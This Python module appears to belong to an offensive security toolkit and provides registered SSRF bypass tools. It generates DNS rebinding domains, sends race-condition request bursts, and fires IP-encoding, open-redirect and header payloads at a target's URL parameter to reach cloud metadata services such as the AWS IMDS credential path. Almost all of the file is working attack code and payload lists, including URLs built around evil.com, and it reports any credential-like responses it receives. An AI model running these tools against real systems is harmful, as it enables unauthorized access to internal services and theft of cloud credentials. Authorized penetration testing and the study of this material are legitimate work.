"""DNS Rebinding SSRF bypass tool.

Technique: DNS rebinding exploits the window between when an application
validates a hostname (gets external IP - passes allowlist) and when it
makes the actual request (resolves again - gets internal IP).

Supports:
- External rebinding services (rbndr.us, rebinder.io, nip.io patterns)
- TOCTOU SSRF via redirect chains
- Race-condition rebinding with rapid concurrent requests
"""

from __future__ import annotations

import ipaddress
import re
import subprocess
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Any

from config import Config
from tool_registry import Tool
from utils import sanitize_subprocess_arg


# ---------------------------------------------------------------------------
# Rebinding service catalog
# ---------------------------------------------------------------------------

# Public DNS rebinding services. Domain format documented inline.
REBINDING_SERVICES: list[dict[str, str]] = [
    {
        "name": "rbndr.us",
        "url": "https://rbndr.us",
        "format": "{external_hex}.{internal_hex}.rbndr.us",
        "notes": (
            "Alternates DNS resolution between two IPs each TTL cycle (1s TTL). "
            "Encode IPs as 8-char hex. e.g. 1.1.1.1 = 01010101, 169.254.169.254 = a9fea9fe"
        ),
    },
    {
        "name": "rebinder.io",
        "url": "https://rebinder.io",
        "format": "{external_ip}--{internal_ip_dashes}.rebinder.io",
        "notes": (
            "Replace dots in IP with dashes. "
            "e.g. 1-1-1-1--169-254-169-254.rebinder.io"
        ),
    },
    {
        "name": "lock.cmpxchg8b.com",
        "url": "https://lock.cmpxchg8b.com",
        "format": "{external_ip}.{internal_ip}.1time.lock.cmpxchg8b.com",
        "notes": "Resolves to external_ip once, then switches to internal_ip permanently.",
    },
    {
        "name": "nip.io (static only)",
        "url": "https://nip.io",
        "format": "{any_prefix}.{internal_ip}.nip.io",
        "notes": (
            "Not true rebinding but useful for bypassing hostname-based SSRF filters. "
            "Resolves to the embedded IP unconditionally."
        ),
    },
    {
        "name": "sslip.io (static only)",
        "url": "https://sslip.io",
        "format": "{any_prefix}.{internal_ip_dashes}.sslip.io",
        "notes": "Like nip.io but replaces dots with dashes. Useful for numeric IP filters.",
    },
]

# SSRF-reachable internal targets ordered by impact
INTERNAL_TARGETS: list[dict[str, str]] = [
    {"ip": "169.254.169.254", "name": "AWS IMDS v1", "path": "/latest/meta-data/"},
    {"ip": "169.254.169.254", "name": "AWS IMDS credentials", "path": "/latest/meta-data/iam/security-credentials/"},
    {"ip": "169.254.169.254", "name": "GCP metadata", "path": "/computeMetadata/v1/"},
    {"ip": "fd00:ec2::254", "name": "AWS IMDS v6", "path": "/latest/meta-data/"},
    {"ip": "100.100.100.200", "name": "Alibaba Cloud metadata", "path": "/latest/meta-data/"},
    {"ip": "192.0.0.192", "name": "Azure IMDS", "path": "/metadata/instance"},
    {"ip": "127.0.0.1", "name": "Localhost", "path": "/"},
    {"ip": "0.0.0.0", "name": "Localhost (0.0.0.0)", "path": "/"},
    {"ip": "localhost", "name": "Localhost hostname", "path": "/"},
    {"ip": "[::]", "name": "IPv6 loopback", "path": "/"},
]

# Common SSRF parameter names
SSRF_PARAMS: list[str] = [
    "url", "uri", "src", "source", "dest", "destination", "redirect",
    "redirect_url", "callback", "return", "return_url", "next", "path",
    "file", "resource", "endpoint", "webhook", "proxy", "image_url",
    "img_url", "load", "fetch", "request", "req", "host", "to",
]

# Open redirect patterns for TOCTOU chaining
REDIRECT_PAYLOADS: list[str] = [
    "//169.254.169.254/latest/meta-data/",
    "https://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254@evil.com/",
    "http://[::ffff:169.254.169.254]/latest/meta-data/",
    "http://0177.0376.0251.0376/latest/meta-data/",  # octal
    "http://0xA9FEA9FE/latest/meta-data/",             # hex
    "http://2852039166/latest/meta-data/",              # decimal
    "http://169.254.169.254%09/latest/meta-data/",     # tab encoding
    "http://169.254.169.254%23@evil.com/",              # fragment confusion
    "http://evil.com#@169.254.169.254/latest/meta-data/",
]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _ip_to_hex(ip: str) -> str:
    """Convert dotted-decimal IPv4 to 8-char hex for rbndr.us."""
    try:
        parts = [int(p) for p in ip.split(".")]
        return "".join(f"{p:02x}" for p in parts)
    except Exception:
        return ""


def _ip_to_dashes(ip: str) -> str:
    """Convert dotted-decimal IPv4 to dash-separated for rebinder.io."""
    return ip.replace(".", "-")


def _build_rebind_domains(external_ip: str, internal_ip: str) -> dict[str, str]:
    """Build rebinding hostnames for all supported services."""
    ext_hex = _ip_to_hex(external_ip)
    int_hex = _ip_to_hex(internal_ip)
    ext_dashes = _ip_to_dashes(external_ip)
    int_dashes = _ip_to_dashes(internal_ip)

    domains: dict[str, str] = {}

    if ext_hex and int_hex:
        domains["rbndr.us"] = f"{ext_hex}.{int_hex}.rbndr.us"

    if ext_dashes and int_dashes:
        domains["rebinder.io"] = f"{ext_dashes}--{int_dashes}.rebinder.io"
        domains["lock.cmpxchg8b.com"] = (
            f"{external_ip}.{internal_ip}.1time.lock.cmpxchg8b.com"
        )

    if int_dashes:
        domains["nip.io"] = f"rebind.{int_dashes}.nip.io"
        domains["sslip.io"] = f"rebind.{int_dashes}.sslip.io"

    return domains


def _resolve_hostname(hostname: str) -> str:
    """DNS lookup via subprocess nslookup - avoids socket caching issues."""
    try:
        result = subprocess.run(
            ["nslookup", hostname],
            capture_output=True, text=True, timeout=5
        )
        # Extract the last "Address:" line that is not the server
        addresses = re.findall(r"Address:\s*(\S+)", result.stdout)
        # Skip nameserver address (first one) and return actual resolution
        return addresses[-1] if len(addresses) > 1 else (addresses[0] if addresses else "")
    except Exception:
        return ""


def _http_probe(url: str, headers: dict[str, str] | None = None, timeout: int = 8) -> dict[str, Any]:
    """Make an HTTP request and return status, headers, and body snippet."""
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(2048).decode("utf-8", errors="replace")
            return {
                "status": resp.status,
                "headers": dict(resp.headers),
                "body": body,
                "error": "",
            }
    except urllib.error.HTTPError as exc:
        body = exc.read(512).decode("utf-8", errors="replace") if exc.fp else ""
        return {"status": exc.code, "headers": {}, "body": body, "error": str(exc)}
    except Exception as exc:
        return {"status": 0, "headers": {}, "body": "", "error": str(exc)}


def _looks_like_metadata(body: str) -> bool:
    """Heuristic: does the response body look like cloud metadata?"""
    metadata_signals = [
        "ami-id", "instance-id", "instance-type", "security-credentials",
        "iam", "access-key", "secret-key", "token", "compute/v1",
        "computeMetadata", "meta-data", "userdata", "hostname",
        "local-ipv4", "public-keys",
    ]
    body_lower = body.lower()
    return any(sig.lower() in body_lower for sig in metadata_signals)


# ---------------------------------------------------------------------------
# Main tool functions
# ---------------------------------------------------------------------------

def dns_rebind_test(
    target: str,
    internal_ip: str = "169.254.169.254",
    callback_domain: str = "",
) -> dict[str, Any]:
    """Test for SSRF bypass via DNS rebinding.

    Technique: Register a domain that alternates between resolving to
    the target's external IP and an internal IP. When the application:
    1. Resolves domain - gets external IP (passes validation)
    2. Makes request - resolves again - gets internal IP (bypasses filter)

    Uses external rebinding services (rbndr.us, rebinder.io, etc.).
    """
    target_url = target if target.startswith("http") else f"https://{target}"
    parsed = urllib.parse.urlparse(target_url)
    domain = parsed.netloc.split(":")[0]

    # Resolve target to get its current external IP
    external_ip = _resolve_hostname(domain)
    if not external_ip:
        external_ip = "1.2.3.4"  # fallback - real IP doesn't matter much for test

    findings: list[str] = []
    tested_domains: list[dict[str, str]] = []
    payloads_generated: list[str] = []

    rebind_domains = _build_rebind_domains(external_ip, internal_ip)

    output_parts = [
        f"=== DNS Rebinding SSRF Test: {target} ===",
        f"Target domain: {domain}",
        f"Resolved external IP: {external_ip}",
        f"Internal target: {internal_ip}",
        "",
        "--- Rebinding Domains Generated ---",
    ]

    for service, rebind_domain in rebind_domains.items():
        output_parts.append(f"  [{service}] {rebind_domain}")
        payloads_generated.append(rebind_domain)
        tested_domains.append({"service": service, "domain": rebind_domain})

    output_parts += [
        "",
        "--- SSRF Parameter Test Payloads ---",
    ]

    # Generate injectable payloads for common SSRF params
    injectable_payloads: list[str] = []
    for param in SSRF_PARAMS[:8]:  # top 8 most common
        for rebind_domain in list(rebind_domains.values())[:2]:  # top 2 services
            payload_url = f"http://{rebind_domain}/latest/meta-data/"
            injectable_payloads.append(f"  {param}={payload_url}")

    output_parts.extend(injectable_payloads[:12])

    output_parts += [
        "",
        "--- DNS Resolution Verification ---",
    ]

    # Verify at least one rebinding domain resolves (proves service is reachable)
    verified_domains: list[str] = []
    for service, rebind_domain in list(rebind_domains.items())[:2]:
        resolved = _resolve_hostname(rebind_domain)
        status = f"resolved to: {resolved}" if resolved else "resolution failed"
        output_parts.append(f"  [{service}] {rebind_domain} - {status}")
        if resolved:
            verified_domains.append(rebind_domain)

    # Test callback domain if provided (out-of-band confirmation)
    if callback_domain:
        output_parts += [
            "",
            "--- Out-of-Band Callback Test ---",
        ]
        oob_domain = f"dns-rebind-test.{callback_domain}"
        output_parts.append(f"  Monitor: {oob_domain}")
        output_parts.append(
            f"  Inject: url=http://{oob_domain}/ in target SSRF parameters"
        )

    output_parts += [
        "",
        "--- Attack Methodology ---",
        "1. Submit a URL containing a rebinding domain to a SSRF-vulnerable parameter.",
        "2. Application resolves the domain -> gets external IP (allowlist passes).",
        "3. Application makes the HTTP request -> domain resolves again -> gets internal IP.",
        "4. TTL is set to 1s by rbndr.us - timing window is tight, use dns_rebind_race()",
        "   for repeated attempts to hit the rebind window.",
        "",
        "--- Static Bypass Alternatives (nip.io / sslip.io) ---",
        "  These are NOT true rebinding but bypass hostname-based SSRF filters:",
    ]

    for rebind_domain in [rebind_domains.get("nip.io", ""), rebind_domains.get("sslip.io", "")]:
        if rebind_domain:
            output_parts.append(f"  http://{rebind_domain}/latest/meta-data/")

    if verified_domains:
        findings.append(
            f"Rebinding infrastructure reachable: {', '.join(verified_domains)}"
        )

    return {
        "stdout": "\n".join(output_parts),
        "stderr": "",
        "returncode": 0,
        "parsed": {
            "target": target,
            "external_ip": external_ip,
            "internal_ip": internal_ip,
            "rebind_domains": rebind_domains,
            "verified_domains": verified_domains,
            "injectable_payloads": [
                f"http://{d}/latest/meta-data/"
                for d in list(rebind_domains.values())[:3]
            ],
            "findings": findings,
        },
    }


def dns_rebind_race(
    target: str,
    ssrf_param: str,
    internal_ip: str = "169.254.169.254",
) -> dict[str, Any]:
    """Race condition DNS rebinding - rapid requests to exploit TTL window.

    Sends 20 rapid requests using the rebinding domain, attempting to catch
    the TTL flip where the domain resolves to the internal IP instead of the
    external IP. Uses threading.Barrier for synchronized burst.
    """
    target_url = target if target.startswith("http") else f"https://{target}"
    parsed = urllib.parse.urlparse(target_url)
    domain = parsed.netloc.split(":")[0]
    external_ip = _resolve_hostname(domain) or "1.2.3.4"

    rebind_domains = _build_rebind_domains(external_ip, internal_ip)
    rbndr_domain = rebind_domains.get("rbndr.us", "")

    if not rbndr_domain:
        return {
            "stdout": "Could not generate rbndr.us domain - invalid IP addresses.",
            "stderr": "",
            "returncode": 1,
            "parsed": {"error": "domain_generation_failed"},
        }

    payload_url = f"http://{rbndr_domain}/latest/meta-data/"
    inject_url = f"{target_url}?{ssrf_param}={urllib.parse.quote(payload_url)}"

    output_parts = [
        f"=== DNS Rebinding Race Test: {target} ===",
        f"SSRF parameter: {ssrf_param}",
        f"Rebinding domain: {rbndr_domain}",
        f"Payload URL: {payload_url}",
        f"Inject URL: {inject_url}",
        "",
        "--- Sending 20 rapid requests to hit TTL flip window ---",
    ]

    THREAD_COUNT = 20
    results: list[dict[str, Any]] = [{}] * THREAD_COUNT
    barrier = threading.Barrier(THREAD_COUNT, timeout=10)

    def _worker(index: int) -> None:
        try:
            barrier.wait()
        except threading.BrokenBarrierError:
            results[index] = {"status": -1, "body": "", "error": "barrier broken"}
            return
        result = _http_probe(inject_url, timeout=10)
        results[index] = result

    threads = [threading.Thread(target=_worker, args=(i,)) for i in range(THREAD_COUNT)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=20)

    # Analyze results for metadata leakage
    metadata_hits: list[int] = []
    status_counts: dict[int, int] = {}
    for i, r in enumerate(results):
        if not r:
            continue
        status = r.get("status", 0)
        status_counts[status] = status_counts.get(status, 0) + 1
        body = r.get("body", "")
        if _looks_like_metadata(body):
            metadata_hits.append(i)
            output_parts.append(
                f"  [REQUEST {i+1}] METADATA RESPONSE DETECTED - "
                f"status={status} body_preview={body[:200]}"
            )

    output_parts += [
        "",
        f"  Requests sent: {THREAD_COUNT}",
        f"  Status distribution: {dict(sorted(status_counts.items()))}",
        f"  Metadata responses: {len(metadata_hits)}/{THREAD_COUNT}",
    ]

    if metadata_hits:
        output_parts.append(
            "\n  [CONFIRMED] DNS rebinding succeeded - metadata responses received. "
            "Capture full response and document as SSRF via DNS rebind."
        )
        severity = "critical"
    else:
        output_parts.append(
            "\n  No metadata responses detected in this burst. "
            "TTL window may be tight - retry or use external rebinding service "
            "with longer TTL. Also test nip.io static bypass."
        )
        severity = ""

    return {
        "stdout": "\n".join(output_parts),
        "stderr": "",
        "returncode": 0 if metadata_hits else 1,
        "parsed": {
            "target": target,
            "ssrf_param": ssrf_param,
            "rebind_domain": rbndr_domain,
            "requests_sent": THREAD_COUNT,
            "metadata_hits": metadata_hits,
            "status_distribution": status_counts,
            "severity": severity,
            "confirmed": bool(metadata_hits),
        },
    }


def toctou_ssrf_test(target: str, ssrf_param: str) -> dict[str, Any]:
    """Time-of-check-time-of-use SSRF bypass.

    Tests if the application validates URL at check time but follows
    redirects at use time to internal resources.

    Attack chain:
    1. Submit a URL pointing to attacker-controlled redirect server.
    2. Application validates URL (check time) - sees external domain (allowed).
    3. Application fetches URL (use time) - redirect fires -> internal resource.
    """
    target_url = target if target.startswith("http") else f"https://{target}"

    output_parts = [
        f"=== TOCTOU SSRF Test: {target} ===",
        f"SSRF parameter: {ssrf_param}",
        "",
        "--- Test 1: Direct Internal IP Payloads ---",
    ]

    direct_results: list[dict[str, Any]] = []
    for payload in REDIRECT_PAYLOADS[:6]:
        inject_url = f"{target_url}?{ssrf_param}={urllib.parse.quote(payload)}"
        result = _http_probe(inject_url, timeout=8)
        status = result.get("status", 0)
        body = result.get("body", "")
        metadata = _looks_like_metadata(body)
        marker = "[HIT]" if metadata else "     "
        output_parts.append(
            f"  {marker} payload={payload[:60]:<60} status={status}"
        )
        if metadata:
            output_parts.append(f"         body_preview: {body[:200]}")
        direct_results.append({
            "payload": payload,
            "status": status,
            "metadata_detected": metadata,
            "body_preview": body[:200],
        })

    output_parts += [
        "",
        "--- Test 2: TOCTOU via Open Redirect Chain ---",
        "  Pattern: submit URL -> app validates (passes) -> app fetches -> redirect fires -> internal",
        "",
        "  Setup your redirect server to return:",
        "    HTTP 302 Location: http://169.254.169.254/latest/meta-data/",
        "",
        "  Then submit these to the SSRF parameter:",
    ]

    # Open redirect bypass patterns using common redirect helpers
    redirect_chain_payloads = [
        f"https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/",
        f"https://requestbin.net/r/anything?redir=http://169.254.169.254/latest/meta-data/",
        "http://metadata.nicob.net/",     # known SSRF redirect service
        "http://169.254.169.254.xip.io/latest/meta-data/",
        f"http://localtest.me/",           # resolves to 127.0.0.1
        "http://lvh.me/",                  # resolves to 127.0.0.1
        "http://127.0.0.1.nip.io/",
        "http://0x7f000001/",              # hex 127.0.0.1
        "http://2130706433/",              # decimal 127.0.0.1
        "http://0177.0.0.1/",              # octal 127.0.0.1
    ]

    redirect_results: list[dict[str, Any]] = []
    for payload in redirect_chain_payloads[:5]:
        inject_url = f"{target_url}?{ssrf_param}={urllib.parse.quote(payload)}"
        result = _http_probe(inject_url, timeout=8)
        status = result.get("status", 0)
        body = result.get("body", "")
        metadata = _looks_like_metadata(body)
        marker = "[HIT]" if metadata else "     "
        output_parts.append(
            f"  {marker} {payload[:80]}"
        )
        if metadata:
            output_parts.append(f"         body_preview: {body[:200]}")
        redirect_results.append({
            "payload": payload,
            "status": status,
            "metadata_detected": metadata,
        })

    output_parts += [
        "",
        "--- Test 3: Header-Based SSRF Triggers ---",
        "  Try injecting internal URLs via non-obvious headers:",
        "    X-Forwarded-For: 169.254.169.254",
        "    X-Real-IP: 169.254.169.254",
        "    X-Originating-IP: 169.254.169.254",
        "    Client-IP: 169.254.169.254",
        "    True-Client-IP: 169.254.169.254",
        "    X-Forwarded-Host: 169.254.169.254",
    ]

    header_results: list[dict[str, Any]] = []
    internal_ip_headers = [
        "X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
        "Client-IP", "True-Client-IP", "X-Forwarded-Host",
    ]
    for header_name in internal_ip_headers:
        result = _http_probe(
            target_url,
            headers={header_name: "169.254.169.254"},
            timeout=6,
        )
        body = result.get("body", "")
        metadata = _looks_like_metadata(body)
        if metadata:
            output_parts.append(
                f"  [HIT] Header {header_name}: 169.254.169.254 - metadata response detected!"
            )
            header_results.append({
                "header": header_name,
                "value": "169.254.169.254",
                "metadata_detected": True,
                "body_preview": body[:200],
            })

    # Summarize
    all_hits = (
        [r for r in direct_results if r.get("metadata_detected")]
        + [r for r in redirect_results if r.get("metadata_detected")]
        + header_results
    )
    confirmed = bool(all_hits)

    output_parts += [
        "",
        "--- Summary ---",
        f"  Direct payload hits: {sum(1 for r in direct_results if r.get('metadata_detected'))}",
        f"  Redirect chain hits: {sum(1 for r in redirect_results if r.get('metadata_detected'))}",
        f"  Header-based hits: {len(header_results)}",
        f"  Confirmed: {'YES - SSRF CONFIRMED' if confirmed else 'No hits detected'}",
    ]

    return {
        "stdout": "\n".join(output_parts),
        "stderr": "",
        "returncode": 0 if confirmed else 1,
        "parsed": {
            "target": target,
            "ssrf_param": ssrf_param,
            "confirmed": confirmed,
            "direct_hits": [r for r in direct_results if r.get("metadata_detected")],
            "redirect_hits": [r for r in redirect_results if r.get("metadata_detected")],
            "header_hits": header_results,
            "severity": "critical" if confirmed else "",
        },
    }


# ---------------------------------------------------------------------------
# Tool registration
# ---------------------------------------------------------------------------

def register_dns_rebind_tools(config: Config) -> list[Tool]:
    """Register DNS rebinding SSRF bypass tools."""
    tools: list[Tool] = []

    tools.append(Tool(
        name="dns_rebind_test",
        description=(
            "Test for SSRF bypass via DNS rebinding. "
            "Generates rebinding domains using rbndr.us, rebinder.io, nip.io, and sslip.io "
            "that alternate between external and internal IP resolution. "
            "Use when SSRF filters are IP-based and the app resolves hostnames."
        ),
        parameters={
            "target": "Target URL or domain (e.g. https://target.com)",
            "internal_ip": "Internal IP to rebind to (default: 169.254.169.254 for cloud metadata)",
            "callback_domain": "Optional OOB callback domain (e.g. burpcollaborator.net) for DNS confirmation",
        },
        example='dns_rebind_test(target="https://target.com", internal_ip="169.254.169.254")',
        phase_tags=["exploitation", "ssrf", "bypass"],
        execute=dns_rebind_test,
    ))

    tools.append(Tool(
        name="dns_rebind_race",
        description=(
            "Race condition DNS rebinding - sends 20 concurrent requests to exploit the "
            "TTL flip window. Use after dns_rebind_test identifies a rebinding domain. "
            "Maximizes chance of catching the 1s TTL window where domain resolves to internal IP."
        ),
        parameters={
            "target": "Target URL (e.g. https://target.com/api/fetch)",
            "ssrf_param": "The parameter name that triggers the server-side request (e.g. url, src)",
            "internal_ip": "Internal IP to target (default: 169.254.169.254)",
        },
        example='dns_rebind_race(target="https://target.com/api/fetch", ssrf_param="url")',
        phase_tags=["exploitation", "ssrf", "race", "bypass"],
        execute=dns_rebind_race,
    ))

    tools.append(Tool(
        name="toctou_ssrf_test",
        description=(
            "TOCTOU SSRF bypass via redirect chains. Tests if the application validates "
            "a URL at check time but follows open redirects at use time to reach internal "
            "resources. Also tests IP encoding bypasses (hex, octal, decimal) and "
            "header-based SSRF triggers (X-Forwarded-For, etc.)."
        ),
        parameters={
            "target": "Target URL (e.g. https://target.com/api/import)",
            "ssrf_param": "The parameter name that triggers the server-side request (e.g. url, webhook)",
        },
        example='toctou_ssrf_test(target="https://target.com/api/import", ssrf_param="url")',
        phase_tags=["exploitation", "ssrf", "bypass"],
        execute=toctou_ssrf_test,
    ))

    return tools
